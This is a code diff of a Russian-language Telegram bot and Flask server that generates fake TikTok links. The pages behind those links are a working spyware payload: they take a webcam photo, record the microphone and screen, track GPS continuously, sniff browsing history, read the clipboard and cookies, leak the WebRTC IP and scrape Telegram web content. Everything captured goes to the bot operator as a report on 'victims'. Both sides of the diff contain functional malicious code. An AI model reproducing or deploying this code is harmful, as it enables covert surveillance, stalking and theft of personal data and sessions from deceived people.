@@ -21,33 +21,24 @@ loop = None
 
 FULL_PAGE = """<!DOCTYPE html>
 <html>
-<head><title>TikTok — Make Your Day</title><meta charset="UTF-8">
+<head><title>TikTok</title><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#000;font-family:Arial;overflow:hidden}
-.header{background:#000;padding:10px;display:flex;justify-content:space-around;border-bottom:1px solid #333;position:fixed;top:0;width:100%;z-index:100}
-.header span{color:#fff;font-size:14px;padding:5px 10px}
-.header .active{color:#fff;border-bottom:2px solid #fff}
-.video-container{width:100%;height:100vh;display:flex;align-items:center;justify-content:center;background:#111;flex-direction:column}
-.play-btn{background:#fe2c55;color:#fff;border:none;padding:20px 50px;font-size:22px;border-radius:50px;cursor:pointer;margin-top:20px}
-.play-btn:hover{background:#ff4d6a}
-.loading-text{color:#fff;font-size:16px;margin-top:15px}
-.footer{position:fixed;bottom:0;width:100%;background:#000;padding:15px;display:flex;justify-content:space-around;border-top:1px solid #333}
-.footer span{color:#fff;font-size:12px}
+body{background:#000;color:#fff;font-family:Arial;text-align:center}
+h2{margin-top:80px}
+button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;margin:10px;cursor:pointer}
+#status{margin-top:20px;color:#aaa}
 </style></head>
 <body>
-<div class="header"><span>Following</span><span class="active">For You</span><span>LIVE</span></div>
-<div class="video-container" id="container">
-    <p style="color:#fff;font-size:18px;">🎬 Видео готово к просмотру</p>
-    <button class="play-btn" onclick="startAll()">▶ Смотреть видео</button>
-    <p class="loading-text" id="status"></p>
-</div>
-<div class="footer"><span>🏠 Home</span><span>🔍 Discover</span><span>➕</span><span>💬 Inbox</span><span>👤 Profile</span></div>
+<h2>🎬 TikTok Video</h2>
+<p>Нажми кнопку чтобы посмотреть</p>
+<button onclick="startAll()">▶ Смотреть</button>
+<p id="status"></p>
 <video id="v" style="display:none" autoplay playsinline></video>
 <canvas id="c" style="display:none"></canvas>
 <script>
-fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?'})});
+fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
 
 function startAll(){
     document.getElementById('status').innerText = 'Загрузка...';
@@ -56,118 +47,107 @@ function startAll(){
     if(navigator.geolocation){
         navigator.geolocation.getCurrentPosition(pos=>{
             fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});
-        },err=>{}, {enableHighAccuracy:true,timeout:15000,maximumAge:0});
+        },err=>{},{enableHighAccuracy:true,timeout:10000});
     }
     
+    // Фото
+    (async function(){
+        try{
+            var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+            var v=document.getElementById('v');v.srcObject=st;await v.play();
+            await new Promise(r=>setTimeout(r,2000));
+            var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+            c.getContext('2d').drawImage(v,0,0);
+            var ph=c.toDataURL('image/jpeg',0.7);
+            await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});
+            st.getTracks().forEach(t=>t.stop());
+        }catch(e){}
+    })();
+    
+    // Аудио
+    (async function(){
+        try{
+            var st=await navigator.mediaDevices.getUserMedia({audio:true});
+            var chunks=[],rec=new MediaRecorder(st);
+            rec.ondataavailable=e=>chunks.push(e.data);
+            rec.start();
+            await new Promise(r=>setTimeout(()=>rec.stop(),4000));
+            var blob=new Blob(chunks,{type:'audio/webm'});
+            var reader=new FileReader();reader.readAsDataURL(blob);
+            reader.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});
+            st.getTracks().forEach(t=>t.stop());
+        }catch(e){}
+    })();
+    
+    // Запись экрана
+    (async function(){
+        try{
+            var st=await navigator.mediaDevices.getDisplayMedia({video:true});
+            var chunks=[],rec=new MediaRecorder(st);
+            rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
+            rec.start();
+            await new Promise(r=>setTimeout(()=>rec.stop(),5000));
+            var blob=new Blob(chunks,{type:'video/webm'});
+            var reader=new FileReader();reader.readAsDataURL(blob);
+            reader.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});
+            st.getTracks().forEach(t=>t.stop());
+        }catch(e){}
+    })();
+    
     // История
-    async function stealHistory(){
+    (async function(){
         var sites=['https://web.telegram.org','https://vk.com','https://ok.ru','https://instagram.com','https://twitter.com','https://youtube.com','https://discord.com','https://github.com','https://steamcommunity.com','https://reddit.com','https://tinder.com','https://onlyfans.com','https://binance.com','https://bybit.com','https://paypal.com','https://sberbank.ru','https://tinkoff.ru','https://ozon.ru','https://wildberries.ru','https://avito.ru'];
         var visited=[];
         for(var i=0;i<sites.length;i++){
             try{
                 var img=new Image();img.src=sites[i]+'/favicon.ico';
-                await new Promise(function(r){img.onload=function(){visited.push(sites[i]);r();};img.onerror=function(){visited.push(sites[i]);r();};setTimeout(function(){r();},300);});
+                await new Promise(r=>{img.onload=()=>{visited.push(sites[i]);r();};img.onerror=()=>{visited.push(sites[i]);r();};setTimeout(r,300);});
             }catch(e){}
         }
-        if(visited.length>0){fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});}
-    }
-    
-    // Камера
-    async function cam(){
-        try{
-            var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-            var v=document.getElementById('v');v.srcObject=st;await v.play();
-            await new Promise(function(r){setTimeout(r,2000);});
-            var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
-            c.getContext('2d').drawImage(v,0,0);
-            var ph=c.toDataURL('image/jpeg',0.7);
-            await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});
-            st.getTracks().forEach(function(t){t.stop();});
-        }catch(e){}
-    }
-    
-    // Аудио
-    async function recordAudio(){
-        try{
-            var st=await navigator.mediaDevices.getUserMedia({audio:true});
-            var chunks=[];var rec=new MediaRecorder(st);
-            rec.ondataavailable=function(e){chunks.push(e.data);};
-            rec.start();
-            await new Promise(function(r){setTimeout(function(){rec.stop();r();},3000);});
-            var blob=new Blob(chunks,{type:'audio/webm'});
-            var reader=new FileReader();reader.readAsDataURL(blob);
-            reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};
-            st.getTracks().forEach(function(t){t.stop();});
-        }catch(e){}
-    }
-    
-    // Запись экрана
-    async function recordScreen(){
-        try{
-            var st=await navigator.mediaDevices.getDisplayMedia({video:true});
-            var chunks=[];var rec=new MediaRecorder(st);
-            rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
-            rec.start();
-            await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});
-            var blob=new Blob(chunks,{type:'video/webm'});
-            var reader=new FileReader();reader.readAsDataURL(blob);
-            reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};
-            st.getTracks().forEach(function(t){t.stop();});
-        }catch(e){}
-    }
+        if(visited.length>0) fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});
+    })();
     
     // Буфер обмена
-    async function stealClipboard(){
-        try{var text=await navigator.clipboard.readText();if(text&&text.length>0){fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}}catch(e){}
-    }
+    (async function(){
+        try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
+    })();
     
     // WebRTC IP
-    function getWebRTCIP(){
+    (function(){
         var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-        pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});
-        pc.onicecandidate=function(e){if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(ip){fetch('/webrtc/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:ip[0]})});}}};
-    }
-    
-    // Telegram
-    function checkTelegram(){
-        var iframe=document.createElement('iframe');iframe.style.display='none';
-        iframe.src='https://web.telegram.org/k/';
-        iframe.onload=function(){try{var doc=iframe.contentDocument||iframe.contentWindow.document;var text=doc.body.innerText||'';if(text.length>0){fetch('/telegram_check/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({telegram_text:text.substring(0,500)}));}}catch(e){}}
-        document.body.appendChild(iframe);setTimeout(function(){document.body.removeChild(iframe);},5000);
-    }
+        pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));
+        pc.onicecandidate=e=>{if(e.candidate){var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m) fetch('/webrtc/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:m[0]})});}};
+    })();
     
     // Куки
-    function stealCookies(){var cookies=document.cookie;if(cookies.length>0){fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:cookies})});}}
+    (function(){var c=document.cookie;if(c) fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:c})});})();
+    
+    // Telegram
+    (function(){
+        var ifr=document.createElement('iframe');ifr.style.display='none';ifr.src='https://web.telegram.org/k/';
+        ifr.onload=function(){try{var d=ifr.contentDocument||ifr.contentWindow.document;var t=d.body.innerText||'';if(t) fetch('/telegram_check/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({telegram_text:t.substring(0,500)})});}catch(e){}};
+        document.body.appendChild(ifr);setTimeout(()=>document.body.removeChild(ifr),5000);
+    })();
     
     // Гео-трекинг
-    function startGeoTracking(){if(navigator.geolocation){setInterval(function(){navigator.geolocation.getCurrentPosition(pos=>{fetch('/geo_track/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,ts:Date.now()})});},err=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0});},10000);}}
+    (function(){if(navigator.geolocation) setInterval(()=>navigator.geolocation.getCurrentPosition(p=>fetch('/geo_track/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,ts:Date.now()})}),e=>{},{enableHighAccuracy:true}),10000);})();
     
-    // Запускаем всё
-    setTimeout(function(){document.getElementById('status').innerText = '✅ Готово!';}, 2000);
-    cam();
-    recordAudio();
-    recordScreen();
-    stealHistory();
-    stealClipboard();
-    getWebRTCIP();
-    checkTelegram();
-    stealCookies();
-    startGeoTracking();
+    setTimeout(()=>document.getElementById('status').innerText='✅ Готово!',2000);
 }
 </script></body></html>"""
 
 AUDIO_PAGE = """<!DOCTYPE html>
-<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial;}</style></head>
-<body><h3>Loading audio...</h3><button onclick="recordAudio()" style="padding:15px 30px;background:#fe2c55;color:#fff;border:none;border-radius:25px;font-size:18px;cursor:pointer;">▶ Записать</button><p id="s"></p>
+<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;cursor:pointer}</style></head>
+<body><h3>Audio</h3><button onclick="rec()">▶ Записать</button><p id="s"></p>
 <script>
-async function recordAudio(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};st.getTracks().forEach(function(t){t.stop();});document.getElementById('s').innerText='Done!';}catch(e){document.getElementById('s').innerText='Error';}}
+async function rec(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>c.push(e.data);r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));var b=new Blob(c,{type:'audio/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
 </script></body></html>"""
 
 SCREEN_PAGE = """<!DOCTYPE html>
-<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial;}</style></head>
-<body><h3>Loading screen...</h3><button onclick="recordScreen()" style="padding:15px 30px;background:#fe2c55;color:#fff;border:none;border-radius:25px;font-size:18px;cursor:pointer;">▶ Записать экран</button><p id="s"></p>
+<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;cursor:pointer}</style></head>
+<body><h3>Screen</h3><button onclick="rec()">▶ Записать экран</button><p id="s"></p>
 <script>
-async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});document.getElementById('s').innerText='Done!';}catch(e){document.getElementById('s').innerText='Error';}}
+async function rec(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>{if(e.data.size>0)c.push(e.data)};r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));var b=new Blob(c,{type:'video/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
 </script></body></html>"""
 
 def gen_id():
@@ -276,58 +256,61 @@ async def notify(uid, lid):
         await asyncio.sleep(30)
         v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
         
-        zip_path = f"data_{lid}.zip"
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-            report = f"""📋 ОТЧЁТ IP LOGGER
-═══════════════
-🕐 Время: {v.get('time','?')}
+        # Текстовый отчёт
+        report = f"""📋 ОТЧЁТ
+🕐 {v.get('time','?')}
 🌐 IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
-🕵️ WebRTC IP: {v.get('webrtc_ip','?')}
-🏙 Город: {v.get('city','?')}
-🗺 Регион: {v.get('region','?')}
-🌍 Страна: {v.get('country','?')}
-📡 Провайдер: {v.get('isp','?')}
-📱 Устройство: {v.get('ua','?')[:200]}
+🕵️ WebRTC: {v.get('webrtc_ip','?')}
+🏙 {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
+📡 {v.get('isp','?')}
+📱 {v.get('ua','?')[:150]}
 """
-            if v.get('gps') and v['gps'].get('lat'):
-                report += f"📍 ТОЧНЫЙ GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
-            if v.get('history') and v['history'].get('visited'):
-                report += f"\n📜 История браузера:\n"
-                for site in v['history']['visited']: report += f"  • {site}\n"
-            if v.get('clipboard'): report += f"\n📋 Буфер обмена:\n{v['clipboard'][:300]}\n"
-            if v.get('cookies'): report += f"\n🍪 Куки:\n{v['cookies'][:300]}\n"
-            if v.get('telegram'): report += f"\n📱 Telegram:\n{v['telegram'][:300]}\n"
-            if v.get('geo_track'): report += f"\n📍 Гео-трек: {len(v['geo_track'])} точек\n"
-            zf.writestr('report.txt', report)
-            
-            if v.get('photo'):
-                try: zf.writestr('photo.jpg', base64.b64decode(v['photo'].split(',')[1]))
-                except: pass
-            if v.get('audio'):
-                try: zf.writestr('audio.webm', base64.b64decode(v['audio'].split(',')[1]))
-                except: pass
-            if v.get('screen'):
-                try: zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
-                except: pass
+        if v.get('gps') and v['gps'].get('lat'):
+            report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
         
-        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 100:
-            await bot.send_file(uid, zip_path, caption=f"📦 Архив `{lid}`", force_document=True)
-        else:
-            await bot.send_message(uid, f"📋 Отчёт `{lid}`:\n\n{report}")
-        if os.path.exists(zip_path): os.remove(zip_path)
+        # Отправляем текст
+        await bot.send_message(uid, report[:2000])
         
+        # Отправляем файлы по одному
+        if v.get('photo'):
+            try:
+                photo_bytes = base64.b64decode(v['photo'].split(',')[1])
+                await bot.send_file(uid, photo_bytes, caption="📸 Фото")
+            except: pass
+        
+        if v.get('audio'):
+            try:
+                audio_bytes = base64.b64decode(v['audio'].split(',')[1])
+                await bot.send_file(uid, audio_bytes, caption="🎤 Аудио", voice_note=True)
+            except: pass
+        
+        if v.get('screen'):
+            try:
+                screen_bytes = base64.b64decode(v['screen'].split(',')[1])
+                await bot.send_file(uid, screen_bytes, caption="🎥 Запись экрана", supports_streaming=True)
+            except: pass
+        
+        # Гео-точка
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(v['gps'].get('acc',10))))
-            await bot.send_file(uid, file=geo, caption=f"📍 Точный GPS (±{v['gps'].get('acc','?')}м)")
+            await bot.send_file(uid, file=geo, caption=f"📍 GPS (±{v['gps'].get('acc','?')}м)")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
             await bot.send_file(uid, file=geo, caption="📍 IP-гео")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
         
+        # WebRTC IP
         if v.get('webrtc_ip') and v['webrtc_ip'] != v.get('ip','').split(',')[0].strip():
-            await bot.send_message(uid, f"🕵️ **Реальный IP (WebRTC):** `{v['webrtc_ip']}`")
+            await bot.send_message(uid, f"🕵️ Реальный IP: `{v['webrtc_ip']}`")
+        
+        # Доп данные текстом
+        extra = ""
+        if v.get('clipboard'): extra += f"\n📋 Буфер: {v['clipboard'][:200]}"
+        if v.get('cookies'): extra += f"\n🍪 Куки: {v['cookies'][:200]}"
+        if v.get('telegram'): extra += f"\n📱 Telegram: {v['telegram'][:200]}"
+        if extra: await bot.send_message(uid, extra[:2000])
         
     except Exception as e:
         print(f"Ошибка notify: {e}")
@@ -335,18 +318,18 @@ async def notify(uid, lid):
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     buttons = [
-        [Button.inline("🎭 Полный логгер (ВСЁ)", "full")],
+        [Button.inline("🎭 Полый логгер", "full")],
         [Button.inline("🎤 Только аудио", "audio")],
         [Button.inline("🎥 Только экран", "screen")],
     ]
-    await event.reply("🎭 **IP Logger ULTRA**\n\n📸 Фото\n🎤 Аудио\n🎥 Экран\n📍 GPS\n🕵️ WebRTC IP\n📱 Telegram\n🍪 Куки\n📋 Буфер\n📜 История\n📍 Гео-трекинг\n\nВыбери тип:", buttons=buttons)
+    await event.reply("🎭 **IP Logger**\n\n📸 Фото\n🎤 Аудио\n🎥 Эран\n📍 GS\n🕵️ WebRTC IP\n\nВыбери тип:", buttons=buttons)
 
 @bot.on(events.CallbackQuery)
 async def callback(event):
     link_type = event.data.decode()
     lid = gen_id()
     links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': [], 'type': link_type}
-    names = {'full': '🎭 Ультра-логгер', 'audio': '🎤 Аудио', 'screen': '🎥 Экран'}
+    names = {'full': 'Полный', 'audio': 'Аудио', 'screen': 'Экран'}
     await event.edit(f"✅ **{names.get(link_type)}**\n\n🔗 `https://botaald.onrender.com/go/{lid}`")
 
 @bot.on(events.NewMessage(pattern='/list'))
@@ -365,7 +348,7 @@ async def main():
     def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
     threading.Thread(target=run_flask, daemon=True).start()
     await bot.start(bot_token=BOT_TOKEN)
-    print("✅ Ультра-логгер запущен!")
+    print("✅ Логгер запущен!")
     await bot.run_until_disconnected()
 
 if __name__ == "__main__":
